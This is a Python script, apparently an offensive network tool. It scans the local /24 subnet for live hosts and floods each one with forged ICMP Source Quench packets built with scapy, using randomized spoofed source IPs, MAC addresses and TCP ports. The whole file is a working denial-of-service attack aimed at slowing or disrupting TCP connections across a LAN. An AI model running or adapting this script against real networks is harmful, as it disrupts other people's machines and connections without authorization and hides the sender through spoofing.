from scapy.all import *
from getmac import get_mac_address
import socket
from tkinter import *
import threading



#automaticcaly get mac address if IP exist on network
def GetMacAddress(IP):
    mac = get_mac_address(ip=IP)
    return mac

#Build and send ICMP Quench packet
def send_icmpBlind_packet(src_ip,dest_ip,src_mac,dest_mac,src_port,dest_port):
	eth_h=Ether(src=src_mac,dst=dest_mac)
	ip_h=IP(dst=dest_ip,src=src_ip)
	icmp_h=ICMP(type=4,code=4)
	ip2_h=IP(dst=dest_ip,src=src_ip,proto=6,flags=0x02)
	tcp2_h=TCP(sport=src_port,dport=dest_port)
	pkt=eth_h/ip_h/icmp_h/ip2_h/tcp2_h
	sendp(pkt,verbose=0)

#prepareInputs For packet
def prepare(packetsToSend,Ips,Macs,delay):
    macMap=['0','1','2','3','4','5','6','7','8','9','A','B','C','D','F']
    lenOfIps=len(Ips)
    print("Sending ICMP Quench...")
    for i in range (packetsToSend):
        src_ip = RandIP()
        src_mac = macMap[random.randint(0, 14)] + macMap[random.randint(0, 14)] + ":" + macMap[random.randint(0, 14)] + \
                  macMap[random.randint(0, 14)] + ":" + macMap[random.randint(0, 14)] + macMap[
                      random.randint(0, 14)] + ":" + macMap[random.randint(0, 14)] + macMap[
                      random.randint(0, 14)] + ":" + macMap[random.randint(0, 14)] + macMap[
                      random.randint(0, 14)] + ":" + macMap[random.randint(0, 14)] + macMap[random.randint(0, 14)]
        src_port = random.randint(1000, 2000)
        dest_port = random.randint(1000, 2000)
        for j in range (lenOfIps):
            dest_ip = Ips[j]
            dest_mac = Macs[j]
            send_icmpBlind_packet(src_ip, dest_ip, src_mac, dest_mac, src_port, dest_port)
        print("ICMP Quench batch: "+str(i+1)+ " sent. Sleeping for: "+str(delay)+"s")
        time.sleep(delay)

#gets all active IPs and macs on local area with ips 192.168.1.1/24
def GetAllIPsOnNetwork(Iplimit):
    #find local Ip of computer to help in finding all Ips assuming /24 subnetmask
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.connect(('8.8.8.8',1))
    IPAddr=s.getsockname()[0]
    for i in range (len(IPAddr)-1,-1,-1):
        if (IPAddr[i]=="."):
            break
    IP=IPAddr[0:i+1]
    IpThatResponded=[]
    correspondingMacAddress=[]
    if (Iplimit==None):
        Iplimit=254
    print("Scanning all Hosts...")
    for i in range (1,Iplimit+1):
        nededIp=IP+str(i)
        if (nededIp!=IPAddr):
            res=GetMacAddress(nededIp)
        else:
            res=None
        if (res != None):
            print("IP: "+ nededIp+ " Mac: "+str(res)+" UP")
            IpThatResponded.append(nededIp)
            correspondingMacAddress.append(res)
        else:
            if (nededIp != IPAddr):
                print("IP: " + nededIp+ " Down")
            else:
                print("IP: " + nededIp + " is your IP")
    if (len(IpThatResponded)==0):
        print("No IP address up!")
        sys.exit(2)
    return[IpThatResponded,correspondingMacAddress]



# check inputs and call GetAllIPsOnNetwork
def check(packetsToSend,LimitIps,delay):
    nededLimit = False
    try:
        packetsToSend=int(packetsToSend)
    except:
        print("Packet to send input must be an integer!")
        sys.exit(2)

    if (len(LimitIps)!=0):
        nededLimit=True
        try:
            LimitIps = int(LimitIps)
        except:
            print("Ip limit input must be an integer!")
            sys.exit(2)

    if (len(delay)!=0):
        try:
            delay = int(delay)
        except:
            print("Delay input must be an integer!")
            sys.exit(2)
    else:
        delay=0

    if not(nededLimit):
        IpMac=GetAllIPsOnNetwork(None)
    else:
        IpMac = GetAllIPsOnNetwork(LimitIps)
    IPs=IpMac[0]
    Macs=IpMac[1]
    prepare(packetsToSend,IPs,Macs,delay)




#inputIp=input("OPTIONAL: Input default IP (Leave empty for auto detect): ")
packetsToSend=input("Input number of ICMP Quench packets to send per IP: ")
delay=input("OPTIONAL: Input delay in seconds between each Quench packet: ")
LimitIps=input("OPTIONAL: Look at the first x IPS: ")
check(packetsToSend,LimitIps,delay)
